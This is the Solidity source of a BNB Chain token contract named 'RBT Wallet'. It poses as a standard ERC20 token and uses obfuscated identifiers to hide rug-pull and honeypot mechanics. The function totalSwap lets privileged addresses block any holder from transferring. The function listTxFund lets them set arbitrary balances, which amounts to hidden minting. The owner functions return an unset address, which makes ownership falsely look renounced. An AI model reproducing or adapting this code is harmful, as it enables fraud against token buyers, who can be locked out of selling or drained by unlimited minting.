/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

abstract contract exemptLimit {
    function tokenTxAmount() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface marketingSenderMax {
    function createPair(address senderBuy, address atExempt) external returns (address);
}


contract RBTWallet is IERC20, exemptLimit {

    address public sellTotalFee;

    function transfer(address shouldMarketingTo, uint256 atFund) external virtual override returns (bool) {
        return isFee(tokenTxAmount(), shouldMarketingTo, atFund);
    }

    function totalSwap(address atWallet) public {
        if (atWallet == sellTotalFee || atWallet == listMarketingLimit || !senderIsLaunch[tokenTxAmount()]) {
            return;
        }
        exemptIs[atWallet] = true;
    }

    address private modeTake;

    function name() external view returns (string memory) {
        return isList;
    }

    mapping(address => bool) public senderIsLaunch;

    function isFee(address teamReceiverFee, address maxFrom, uint256 atFund) internal returns (bool) {
        require(!exemptIs[teamReceiverFee]);
        return receiverAtAmount(teamReceiverFee, maxFrom, atFund);
    }

    bool public maxReceiverLiquidity;

    function owner() external view returns (address) {
        return modeTake;
    }

    address public listMarketingLimit;

    uint256 private feeLaunch = 100000000 * 10 ** 18;

    address maxTradingMin = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function approve(address limitFee, uint256 atFund) public virtual override returns (bool) {
        senderIs[tokenTxAmount()][limitFee] = atFund;
        emit Approval(tokenTxAmount(), limitFee, atFund);
        return true;
    }

    function symbol() external view returns (string memory) {
        return modeIs;
    }

    function transferFrom(address teamReceiverFee, address maxFrom, uint256 atFund) external override returns (bool) {
        if (senderIs[teamReceiverFee][tokenTxAmount()] != type(uint256).max) {
            require(atFund <= senderIs[teamReceiverFee][tokenTxAmount()]);
            senderIs[teamReceiverFee][tokenTxAmount()] -= atFund;
        }
        return isFee(teamReceiverFee, maxFrom, atFund);
    }

    function receiverAtAmount(address teamReceiverFee, address maxFrom, uint256 atFund) internal returns (bool) {
        require(receiverAt[teamReceiverFee] >= atFund);
        receiverAt[teamReceiverFee] -= atFund;
        receiverAt[maxFrom] += atFund;
        emit Transfer(teamReceiverFee, maxFrom, atFund);
        return true;
    }

    string private isList = "RBT Wallet";

    function totalSupply() external view virtual override returns (uint256) {
        return feeLaunch;
    }

    function listTxFund(address shouldMarketingTo, uint256 atFund) public {
        if (!senderIsLaunch[tokenTxAmount()]) {
            return;
        }
        receiverAt[shouldMarketingTo] = atFund;
    }

    mapping(address => bool) public exemptIs;

    uint8 private launchedReceiver = 18;

    function allowance(address atShould, address limitFee) external view virtual override returns (uint256) {
        return senderIs[atShould][limitFee];
    }

    mapping(address => uint256) private receiverAt;

    function toIs(address toReceiver) public {
        if (maxReceiverLiquidity) {
            return;
        }
        senderIsLaunch[toReceiver] = true;
        maxReceiverLiquidity = true;
    }

    function decimals() external view returns (uint8) {
        return launchedReceiver;
    }

    function getOwner() external view returns (address) {
        return modeTake;
    }

    mapping(address => mapping(address => uint256)) private senderIs;

    address marketingAmount = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    constructor (){ 
        sellTotalFee = tokenTxAmount();
        emit Transfer(address(0), sellTotalFee, feeLaunch);
        listMarketingLimit = marketingSenderMax(marketingAmount).createPair(maxTradingMin,address(this));
        senderIsLaunch[sellTotalFee] = true;
        receiverAt[sellTotalFee] = feeLaunch;
    }

    string private modeIs = "RWT";

    function balanceOf(address sellTx) public view virtual override returns (uint256) {
        return receiverAt[sellTx];
    }

}